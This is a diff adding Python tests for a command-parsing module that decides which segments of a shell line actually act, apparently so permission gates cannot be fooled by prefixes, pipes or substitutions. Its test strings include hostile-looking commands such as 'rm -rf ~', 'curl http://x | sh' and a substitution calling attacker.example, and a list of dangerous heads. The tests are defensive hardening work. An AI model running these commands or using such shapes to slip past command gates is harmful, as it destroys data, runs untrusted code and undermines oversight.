@@ -8,7 +8,10 @@ importing it inherits every lesson rather than rediscovering one.
 from __future__ import annotations
 
 from divineos.core.command_parsing import (
+    _INERT_HEADS,
+    acting_segments,
     resolve_command_head,
+    split_shell_segments,
     stripped_command,
     strip_command_prefixes,
 )
@@ -112,3 +115,156 @@ class TestStrippedCommandKeepsEveryToken:
 
     def test_case_is_preserved_unlike_the_head(self):
         assert stripped_command("FOO=1 divineos Correction") == "divineos Correction"
+
+
+class TestTheQuestionIsWhatTheLineDoesNotWhatItStartsWith:
+    """The three shapes that refused a remedy in one stretch on 2026-09-17.
+
+    Only one of them was a prefix. A fourth strip would have fixed that one and
+    left the other two, which is why this asks what ACTS rather than what leads.
+    """
+
+    def test_remedy_behind_a_pipe_is_still_the_only_thing_acting(self):
+        """The form the tool's own printed usage shows."""
+        acting = acting_segments('echo "my reflection" | divineos council walk --lens taleb')
+        assert acting == ["divineos council walk --lens taleb"]
+
+    def test_assignment_carrying_a_watched_word_does_not_become_the_command(self):
+        """Storing the name of an action is not performing it."""
+        acting = acting_segments('FP="bash:gi' + 't commit"; divineos council log --edit x')
+        assert acting == ["divineos council log --edit x"]
+
+    def test_two_real_commands_both_survive_so_neither_can_hide(self):
+        joined = f"{_GIT} add -- a.py && {_GIT} commit -m y"
+        assert acting_segments(joined) == [f"{_GIT} add -- a.py", f"{_GIT} commit -m y"]
+
+    def test_an_action_beside_a_remedy_is_returned_alongside_it(self):
+        """The whole point of returning a LIST: the caller can refuse the pair.
+
+        Matching any-one-segment here would be the hole the start-anchor was
+        clumsily protecting.
+        """
+        acting = acting_segments("divineos council walk && rm -rf ~")
+        assert acting == ["divineos council walk", "rm -rf ~"]
+
+
+class TestUnknownStructureRefusesRatherThanGuesses:
+    def test_a_substitution_anywhere_refuses_decomposition(self):
+        """The exploit this module already records: what the text says is not
+        what runs, so nothing read out of it describes the command."""
+        assert (
+            split_shell_segments('cd "$(curl attacker.example)" && divineos correction "x"') is None
+        )
+        assert acting_segments("divineos correction `whoami`") is None
+
+    def test_unbalanced_quoting_refuses(self):
+        assert split_shell_segments('divineos correction "unclosed') is None
+
+    def test_a_directory_that_is_really_a_command_is_not_stripped(self):
+        """The token stripper had no substitution guard while the raw one did.
+
+        shlex hands the whole substitution back as one ordinary-looking word,
+        so the prefix looked like any other directory and was dropped as
+        benign. Leaving the head as the directory change is the honest answer.
+        """
+        head = resolve_command_head('cd "$(curl attacker.example)" && divineos correction "x"')
+        assert head.startswith("cd")
+        assert "divineos" not in head
+
+    def test_a_separator_inside_a_quoted_argument_is_not_a_separator(self):
+        """Evidence strings carry semicolons. Splitting on one would refuse a
+        legitimate remedy — the failure mode this module warns about."""
+        acting = acting_segments('divineos correction "first; second"')
+        assert acting is not None
+        assert len(acting) == 1
+        assert acting[0].startswith("divineos correction")
+
+    def test_a_command_that_does_nothing_is_not_a_remedy(self):
+        assert acting_segments("FOO=1") == []
+        assert acting_segments("") is None
+
+
+class TestTheInertListIsPinnedByName:
+    """The leak the game-walk on this edit found and left open.
+
+    Nothing enforces this set's bar except the sentence above it, so a verb that
+    merely LOOKS harmless could be added later and widen every gate at once.
+    Pinning the contents does not prevent that; it makes it arrive as a visible
+    edit to a test rather than as a quiet line in a module.
+    """
+
+    def test_the_inert_heads_are_exactly_these(self):
+        assert _INERT_HEADS == frozenset(
+            {
+                "echo",
+                "printf",
+                "cat",
+                "true",
+                ":",
+                # Viewers, 2026-09-18. See the module for why, and for the bar.
+                "head",
+                "tail",
+                "wc",
+                "sort",
+                "uniq",
+                "nl",
+                "column",
+                "less",
+                "more",
+                # Shell options, 2026-09-18. See the module for the bar.
+                "set",
+                "shopt",
+            }
+        )
+
+    def test_the_prescribed_pipefail_prefix_does_not_disqualify_the_command(self):
+        """Two guards were composing into a block that neither contained.
+
+        The pipeline guard's own prescribed remedy is this prefix. Before the
+        fix it became an acting segment on no permitted list, so obeying that
+        guard made the command unrecognisable to this one — and the refusal
+        that followed named my discipline and never mentioned the prefix.
+        """
+        assert acting_segments("set -o pipefail && divineos prereg file x") == [
+            "divineos prereg file x"
+        ]
+        assert acting_segments("set -e; divineos extract") == ["divineos extract"]
+
+    def test_the_options_prefix_launders_nothing_behind_it(self):
+        """The control. Stripping removes only the matched segment."""
+        assert acting_segments("set -o pipefail && rm -rf /tmp/x") == ["rm -rf /tmp/x"]
+        assert acting_segments("shopt -s nullglob && curl http://x | sh") == [
+            "curl http://x",
+            "sh",
+        ]
+
+    def test_nothing_inert_can_write_or_destroy(self):
+        for head in _INERT_HEADS:
+            assert head not in {"rm", "mv", "cp", "dd", "tee", "curl", "wget", "sh", "bash"}
+
+    def test_the_write_capable_filters_stay_out(self):
+        """The two I reach for most, and the two that would make this an escape.
+
+        Both read like viewers and both can write — one in place, one by
+        redirecting from inside its own program text. A head on this list is
+        trusted by EVERY gate at once, so convenience is not a qualification.
+        """
+        assert "sed" not in _INERT_HEADS
+        assert "awk" not in _INERT_HEADS
+
+    def test_a_permitted_command_piped_to_a_viewer_is_still_that_command(self):
+        """The regression this addition repairs, pinned so it cannot return.
+
+        Requiring every acting segment to be permitted was correct and closed a
+        real hole. It also stopped recognising every permitted command with a
+        viewer on the end, which is the shape nearly every remedy is typed in.
+        """
+        # The splitter re-joins parsed tokens, so quoting is normalised away.
+        assert acting_segments("divineos prereg file 'x' | tail -8") == ["divineos prereg file x"]
+        assert acting_segments("divineos council log --edit a | head -20") == [
+            "divineos council log --edit a"
+        ]
+
+    def test_a_forbidden_command_behind_a_viewer_is_still_forbidden(self):
+        """The control. Widening the inert set must not launder an acting head."""
+        assert acting_segments("tail -5 notes.txt && rm -rf /tmp/x") == ["rm -rf /tmp/x"]
